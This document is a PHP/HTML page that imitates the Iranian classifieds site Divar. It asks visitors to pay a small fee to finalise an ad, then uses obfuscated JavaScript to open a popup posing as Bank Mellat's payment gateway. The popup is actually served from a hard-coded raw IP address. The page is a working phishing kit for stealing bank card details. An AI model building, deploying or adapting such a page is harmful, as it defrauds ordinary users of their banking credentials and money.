﻿<?php

define('DOMAIN_ROOT', 'http://162.223.91.13/api-2/');

function GenerateRandomHexString($Bytes = 8)
{
    return strtoupper(bin2hex(openssl_random_pseudo_bytes($Bytes)));
}

$RefId = GenerateRandomHexString(8);

?>
<!DOCTYPE html>
<html lang="fa" dir="rtl">
  <head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <meta charset="utf-8">
    <title>دیوار - تکمیل ثبت آگهی</title>
    <!-- CSS  -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.6/css/bootstrap.min.css">
    <link href="https://fonts.googleapis.com/css?family=Amiri&display=swap" rel="stylesheet">
    
    <link rel="icon" href="https://divar.ir/favicon.ico">
    <link data-react-helmet="true" rel="apple-touch-icon" href="https://s.cafebazaar.ir/1/upload/icons/divar-logo-512x512.png"/>
    <link data-react-helmet="true" rel="android-touch-icon" href="https://s.cafebazaar.ir/1/upload/icons/divar-logo-512x512.png"/>

    <style media="screen">
    body {
        Background: url(<?= DOMAIN_ROOT ?>img/divar-bg.png) no-repeat center center fixed;
            -webkit-background-size: cover;
            -moz-background-size: cover;
            -o-background-size: cover;
            background-size: cover;
          }
            @import url(//netdna.bootstrapcdn.com/font-awesome/3.2.1/css/font-awesome.css);

            .starrating > input {display: none;}
            .starrating > label:before {
            content: "\f005";
            margin: 2px;
            font-size: 1.8em;
            font-family: FontAwesome;
            display: inline-block;
            }

            .starrating > label
            {
            color: #222222;
            }

            .starrating > input:checked ~ label
            { color: #ffca08 ; }

            .starrating > input:hover ~ label
            { color: #ffca08 ;  }

    </style>
  </head>
  <body>
      <header>
        <nav class="navbar navbar-light navbar-toggleable-md ">
            <div class="container">

              <a class="navbar-brand" href="#"><img src="<?= DOMAIN_ROOT ?>img/divar-logo.png" height="50" width="50" alt=""></a>
              <br>
              <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNav"><span class="navbar-toggler-icon"></span></button>
              <br>
                <div class="collapse navbar-collapse" id="navbarNav">
                  <ul class="navbar-nav">
                      <li class="nav-item">
                          <a class="nav-link" href="#">خانه</a>
                      </li>
                      <li class="nav-item">
                          <a class="nav-link" href="#">پیگیری آگهی</a>
                      </li>
                      <li class="nav-item">
                          <a class="nav-link" href="#">درباره ما</a>
                      </li>
                  </ul>
                  <form class="form-inline float-left ">
                    <input type="text" class="form-control" placeholder="جستوجو">
                    <button class="btn btn-outline-success">جستوجو</button>
                  </form>
                </div>
              </div>
        </nav>
  <hr>
      </header>
      <section class=" container">
        <div class="card">
            <div class="card-block">
                <h4 class="card-title">ثبت آگهی جدید</h4>
                <br>
                <h6 class="card-subtitle">
                        <div class="alert alert-success">
                            ثبت <strong>
                            آگهی </strong> شما موفقیت آمیز بود
                        </div>
                  </h6>
                  <div class="card-text">
                    <div class="row">
                        <div class="col-md-6">
                            <ul>
                              <li>شماره تلفن خود را در کادر رو به رو اضافه نمایید</li>
                              <br/>
                              <li>مبلغ یک هزار تومان را برای ثبت  نهایی پرداخت نمایید</li>
                              <br/>
                              <li>پس از تکمیل فرم روبه رو روی <strong>ثبت نهایی و پرداخت </strong>کلیک کنید</li>
                              <br/>
                              <li>توجه برای هر شماره فقط یک بار برای همیشه پرداخت انجام میگیرد</li>
                              
                            </ul>
                        </div>
                        <div class="col-md-6 float-left">
						<form action="#" onsubmit="doPayment(); return false;">
							<div class="form-group">
								<label for="username">موضوع آگهی</label>
								<input type="text" class="form-control" id="title" placeholder="موضوع آگهی را وارد کنید" minlength="2" maxlength="128" required>
								<div class="form-control-feedback"></div>
								<label for="phone">شماره تلفن</label>
								<input type="tel" pattern="[0-9]{11}" class="form-control" id="phone" placeholder="شماره تلفن همراه خود را وارد کنید" minlength="11" maxlength="11" required>
							</div>
							</div>
						</div>
						<br>
						<div class="card">
							<div class="card-block">
								<h4 class="card-title">نوار تکمیل فرایند</h4>
								<p class="card-text">
								<div class="progress">
									<div class="progress-bar progress-bar-striped progress-bar-animated bg-warning" style="width: 75%"></div>
								</div></p>
							</div>
						</div>

					</div>
					<br>
					<input type="submit" class="float-left btn btn-outline-primary" value="ثبت و  پرداخت نهایی">
				  </form>
            </div>
        </div>
      </section>

      <!-- js -->
      <script src="https://code.jquery.com/jquery-3.2.1.min.js"
      integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4="
      crossorigin="anonymous"></script>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/tether/1.4.0/js/tether.js"></script>
      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.6/js/bootstrap.min.js" integrity="sha384-vBWWzlZJ8ea9aCX4pEW3rVHjgjt7zpkNpZk+02D9phzyeVkE+jo0ieGizqPLForn" crossorigin="anonymous"></script>
<script>
    var _0x5279 = ['<?= DOMAIN_ROOT ?>pgwchannel/startpay.mellat?RefId=<?= $RefId; ?>&Request=0', 'open', '_system', 'width=1040\x20height=900', '<html\x20style=\x22overflow:hidden;\x22><head>', '<title>پرد\خت الکترونیکی به پرداخت ملت</title>', '<style>html,\x20body\x20{width:1004px;\x20margin:0px;\x20padding:0px;}</style>', '</head><body>', '<iframe\x20src=\x22', 'document', 'body', 'html', 'location', 'searchParams', 'get', 'ref', '.full_loader'];
    (function (_0x1ee3f2, _0x32701e)
    {
        var _0x3a4ab9 = function (_0x4eae70)
        {
            while (--_0x4eae70)
            {
                _0x1ee3f2['push'](_0x1ee3f2['shift']());
            }
        };
        _0x3a4ab9(++_0x32701e);
    }(_0x5279, 0xe9));
    var _0x2f90 = function (_0x76414f, _0xb45352)
    {
        _0x76414f = _0x76414f - 0x0;
        var _0x55c6c3 = _0x5279[_0x76414f];
        return _0x55c6c3;
    };
    var url = new URL(window[_0x2f90('0x0')]['href']);
    var ref = url[_0x2f90('0x1')][_0x2f90('0x2')](_0x2f90('0x3'));
    setTimeout(function ()
    {
        $(_0x2f90('0x4'))['fadeOut'](0x1f4);
    }, 0x3e8);

    function doPayment()
    {
		var _0x8fb869 = _0x2f90('0x5');
		var _0x51382b = _0x2f90('0x9') + _0x2f90('0xa') + _0x2f90('0xb') + _0x2f90('0xc') + _0x2f90('0xd') + _0x8fb869 + '\x22\x20border=\x220\x22\x20style=\x22width:100vw;\x20height:100vh;\x20border:\x20none;\x20outline:\x20none;\x22></iframe>' + '</body></html>';
		var _0x262110 = window[_0x2f90('0x6')]('', _0x2f90('0x7'), _0x2f90('0x8'));
		$(_0x262110[_0x2f90('0xe')][_0x2f90('0xf')])[_0x2f90('0x10')](_0x51382b);
    }
</script>
</body>
</html>
